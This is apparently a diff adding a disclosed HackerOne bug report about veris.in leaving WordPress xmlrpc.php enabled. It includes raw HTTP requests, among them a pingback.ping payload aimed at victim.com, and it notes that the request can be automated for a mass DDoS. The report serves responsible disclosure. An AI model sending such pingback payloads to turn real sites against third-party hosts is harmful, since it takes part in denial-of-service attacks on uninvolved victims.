@@ -1,0 +1,67 @@
+ReportLink:https://hackerone.com/reports/124097
+WeaknessName:Denial of Service
+Reporter:https://hackerone.com/aziose
+ReportedTo:Veris(veris)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:12.06.2016 16:08:41
+
+Summary:
+
+Hi team,
+
+Wordpress blogs that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website veris.in has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.
+
+PoC:
+====
+In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp proxy, send the request below:
+```
+POST /xmlrpc.php HTTP/1.1 
+Host: veris.in 
+Connection: keep-alive 
+Content-Length: 175
+
+<?xml version="1.0" encoding="utf-8"?> 
+<methodCall> 
+<methodName>demo.sayHello</methodName> 
+<params> 
+<param>
+<value>admin</value>
+</param> 
+</params> 
+</methodCall>
+```
+
+- Notice that a successful response is received showing that the xmlrpc.php file is enabled.
+
+ 
+- The xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below:
+
+```
+POST /xmlrpc.php HTTP/1.1 
+Host: veris.in
+Connection: keep-alive 
+Content-Length: 293
+
+<methodCall>
+<methodName>pingback.ping</methodName>
+<params>
+<param>
+<value><string>http://victim.com</string></value>
+</param>
+<param>
+<value><string>https://veris.in/anypost</string></value>
+</param>
+</params>
+</methodCall>
+```
+- As soon as the above request is sent, the victim host gets an entry in its log file with a request originating from the veris.in domain verifying the pingback.
+
+- This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
+
+- If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. 
+
+More info: https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
+
+regards,
